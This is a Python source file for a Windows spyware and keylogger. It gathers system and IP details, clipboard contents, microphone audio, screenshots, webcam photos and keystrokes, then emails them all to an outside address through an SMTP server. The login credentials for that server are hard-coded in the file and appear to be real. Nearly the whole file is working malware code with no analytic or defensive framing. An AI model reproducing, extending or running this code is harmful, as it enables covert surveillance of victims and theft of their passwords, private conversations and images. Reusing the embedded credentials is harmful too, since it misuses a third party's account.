
import os

# Libraries
try:
    from email.mime.multipart import MIMEMultipart
    from email.mime.text import MIMEText
    from email.mime.base import MIMEBase
    from email.mime.application import MIMEApplication
    from email import encoders
    import smtplib
    import socket
    import platform
    import win32clipboard
    import pynput.keyboard as keyboard
    import time
    import os
    from scipy.io.wavfile import write
    import sounddevice as sd
    from cryptography.fernet import Fernet
    from requests import get
    from cv2 import VideoCapture, imshow, imwrite, destroyWindow, waitKey
    from PIL import ImageGrab
    import datetime
    from functools import partial
    from urllib import request
    import atexit
    import json
    import ctypes
    import threading
    from threading import Timer
except:
    os.system("pip install -r requirements.txt")

class Config:
   SEND_REPORT_EVERY = 30  # in seconds
   EMAIL_ADDRESS = "it.c0nt1n3ntal@gmail.com"
   SMTP_SERVER = "smtp.mailersend.net"
   SMTP_PORT = 587
   SMTP_USERNAME = "MS_yA4y9Q@trial-3yxj6ljpew0ldo2r.mlsender.net"
   SMTP_PASSWORD = "oFENPhUJMs7TOQAf"

# Global Variables
cwd = os.path.join(os.getcwd(), 'out')

if (os.path.isdir(cwd) is not True): os.mkdir(cwd, 0o666)

dt = str(datetime.datetime.now().strftime("%Y%m%d_%H%M%S"))

system_info = os.path.join(cwd, "systeminfo_" + dt + ".txt")
clipboard_info = os.path.join(cwd,"clipboard_" + dt + ".txt")
audio_info = os.path.join(cwd, "audio_" + dt + ".wav")
screenshot_info = os.path.join(cwd, "screenshot_" + dt + ".png")
webCamShot_info = os.path.join(cwd, "webCamera_" + dt + ".png")
keystrokes_info = os.path.join(cwd, "keystrokes_" + dt + ".log")

microphone_time = 10
time_iteration = 15
number_of_iterations_end = 3

crypt_key = " " # Generate an encryption key from the Cryptography folder

MAP = {
  "space": " ",
  "\r": "\n"
}

TERMINATE_KEY = "f7"
TIMER_DURATION = 10  # Time in seconds (e.g., 60 seconds)

class Keylogger:
    def __init__(self, time_interval, debug=False):
        self.log = ""
        self.interval = time_interval
        self.debug = debug
        self.timer = Timer(self.interval, self.stop)
        self.listener = keyboard.Listener(on_press=self.on_press)

    def on_press(self, key):
        # if self.debug: print('on_press')
        try:
            self.log += key.char
        except AttributeError:
            self.log += f" [{key}] "

    def report(self):
        if self.log != "":
            if self.debug: print('report')
            with open(keystrokes_info, '+x') as f: f.write(self.log)
            self.log = ""
            self.listener.stop()
            self.timer.cancel()
            return
        
        self.timer = Timer(self.interval, self.report)
        self.timer.start()

    def start(self):
        if self.debug: print('start')
        self.listener.start()
        self.report()
        self.listener.join()

    def stop(self):
        self.listener.stop()
        self.timer.cancel()
        return

def keys_logger():
    print(f'starting keys logger information ({TIMER_DURATION}s)')
    keylogger = Keylogger(time_interval=TIMER_DURATION, debug=False)
    keylogger.start()

# Get System Information
def system_information():
    print('starting system information')

    with open(system_info, '+x') as f:
        hostname = socket.gethostname()
        IPAddr = socket.gethostbyname(hostname)
        try:
            public_ip = get("https://api.ipify.org").text
            f.write("Public IP Address: " + public_ip + '\n')
        except Exception:
            f.write("Couldn't get Public IP Address (May be due to max query) \n")

        f.write("Processor Info: " + (platform.processor()) + '\n')
        f.write("System Info: " + platform.system() + " " + platform.version() + '\n')
        f.write("Machine: " + platform.machine() + '\n')
        f.write("Hostname: " + hostname + '\n')
        f.write("Private IP Address: " + IPAddr + '\n')

# Copy Clipboard Data
def copy_clipboard():
    print('starting clipboard information')

    with open(clipboard_info, '+x') as f:
        try:
            win32clipboard.OpenClipboard()
            pasted_data = win32clipboard.GetClipboardData()
            win32clipboard.CloseClipboard()
            f.write("Clipboard Data : \n" + pasted_data + '\n')
        except:
            f.write("Clipboard Could not be copied. \n")

# Get Microphone Recordings
def microphone():
    print(f'starting microphone information ({microphone_time}s)')

    fs = 44100
    seconds = microphone_time
    myrecording = sd.rec(int(seconds*fs), samplerate=fs,channels=2)
    sd.wait()
    write(audio_info, fs, myrecording)

# Get Screenshots
def screenshots():
    print('starting screenshot information')

    im = ImageGrab.grab()
    im.save(screenshot_info)

# Get Snap with WebCamera
def web_camera():
    print('starting web camera information')

    screenshots
    cam = VideoCapture(0)
    result, image = cam.read()
    if result:
        imshow("webCam", image)
        imwrite(webCamShot_info, image)
        waitKey(1)
        destroyWindow("webCam")

def set_wallpaper():
    # Constants for setting the wallpaper
    SPI_SETDESKWALLPAPER = 20
    SPIF_UPDATEINIFILE = 0x01
    SPIF_SENDWININICHANGE = 0x02

    # Call Windows API to change wallpaper
    result = ctypes.windll.user32.SystemParametersInfoW(SPI_SETDESKWALLPAPER, 0, webCamShot_info, SPIF_UPDATEINIFILE | SPIF_SENDWININICHANGE)
    if result: print("wallpaper changed successfully!")
    else: print("failed to change wallpaper.")

def send_report():
    # Creating the Email Object
    message = MIMEMultipart()
    message["From"] = Config.SMTP_USERNAME
    message["To"] = Config.EMAIL_ADDRESS
    message["Subject"] = f"Report {datetime.datetime.now()}"

    body_part = MIMEText(f"Report {datetime.datetime.now()}")
    message.attach(body_part)

    files = [system_info, clipboard_info, audio_info, screenshot_info, webCamShot_info, keystrokes_info]

    for file in files:
        if os.path.isfile(file): 
            with open(file,'rb') as _file: 
                message.attach(MIMEApplication(_file.read(), Name=os.path.split(file)[1]))

    with smtplib.SMTP(Config.SMTP_SERVER, Config.SMTP_PORT) as server:
        server.starttls()
        server.login(Config.SMTP_USERNAME, Config.SMTP_PASSWORD)
        server.send_message(message)
        print(f"Email sent at {datetime.datetime.now()}")

def main():
    system_information()
    copy_clipboard()
    microphone()
    screenshots()
    web_camera()
    set_wallpaper()
    keys_logger()
    send_report()
    return

if __name__ == "__main__":
    main()
    os.system("exit")